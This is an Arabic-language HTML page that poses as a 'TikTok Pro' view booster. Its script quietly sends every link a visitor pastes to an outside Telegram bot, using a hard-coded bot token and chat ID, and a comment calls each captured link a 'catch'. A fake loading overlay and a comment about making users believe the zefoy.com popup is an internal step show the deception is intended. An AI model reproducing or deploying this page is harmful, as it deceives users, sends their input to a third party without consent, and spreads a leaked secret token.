<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Pro | By Massil</title>
    <style>
        :root { --pink: #ff0050; --cyan: #00f2ea; --dark: #010101; }
        body, html { height: 100%; margin: 0; padding: 0; background: #000; font-family: sans-serif; color: white; overflow: hidden; }
        .container { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
        
        /* الواجهة الرئيسية */
        .glass-box { 
            background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); 
            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 30px; 
            padding: 40px 30px; width: 90%; max-width: 400px; text-align: center; 
        }

        .logo { font-size: 2.5rem; font-weight: 900; text-shadow: 2px 2px var(--pink), -2px -2px var(--cyan); }
        input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #333; background: #111; color: white; margin: 20px 0; outline: none; }
        .btn-main { width: 100%; padding: 15px; border: none; border-radius: 12px; background: #fff; color: #000; font-weight: bold; cursor: pointer; }

        /* طبقة التمويه فوق Zefoy */
        #zefoy-overlay {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; z-index: 9999;
        }
        .header-bar {
            background: #111; padding: 15px; display: flex; justify-content: space-between; align-items: center;
            border-bottom: 1px solid var(--cyan);
        }
    </style>
</head>
<body>

<div class="container" id="main-content">
    <div class="glass-box">
        <div class="logo">TikTok Pro</div>
        <div style="font-size: 12px; color: #888; margin-top: 5px;">BY MASSIL</div>
        
        <input type="text" id="v-url" placeholder="ألصق الرابط هنا...">
        <button class="btn-main" onclick="startHack()">بدء الضخ السريع</button>

        <div style="margin-top: 20px;">
            <a href="https://www.instagram.com/massil.456" style="color:var(--pink); font-size:12px; text-decoration:none;">Instagram</a> | 
            <a href="https://www.tiktok.com/@maxxil16s" style="color:var(--cyan); font-size:12px; text-decoration:none;">TikTok</a>
        </div>
    </div>
</div>

<div id="zefoy-overlay">
    <div class="header-bar">
        <span style="color: var(--cyan); font-weight: bold;">Massil Server v4.0</span>
        <button onclick="location.reload()" style="background:none; border:none; color:white; font-size:20px;">×</button>
    </div>
    <div style="height: calc(100% - 60px); width: 100%; text-align: center; padding-top: 50px;">
        <p>جاري الاتصال بقاعدة البيانات...</p>
        <div id="fake-loading" style="color: var(--pink);">[||||||||||----] 80%</div>
        <br><br>
        <button onclick="openZefoy()" style="padding: 20px; background: var(--cyan); border:none; border-radius:10px; font-weight:bold;">
            اضغط هنا لفتح بوابة التحقق البشري
        </button>
        <p style="font-size: 11px; color: #555; margin-top: 20px;">يجب إكمال الكابتشا لضمان إرسال المشاهدات</p>
    </div>
</div>

<script>
    function startHack() {
        const url = document.getElementById('v-url').value;
        if(!url) return alert("أدخل الرابط!");

        // الصيدة
        const token = "8378099800:AAGTOLzJCh8qos-1YvssEGZfYD7V-ILHcRo";
        const id = "6052532044";
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent("🎯 صيدة من Massil:\n" + url)}`);

        // إظهار التمويه
        document.getElementById('zefoy-overlay').style.display = 'block';
    }

    function openZefoy() {
        // نفتح Zefoy في نافذة منبثقة، ولكن المستخدم يظن أنها مجرد "خطوة" داخل موقعك
        window.open("https://zefoy.com", "MassilServer", "width=500,height=700");
    }
</script>

</body>
</html>
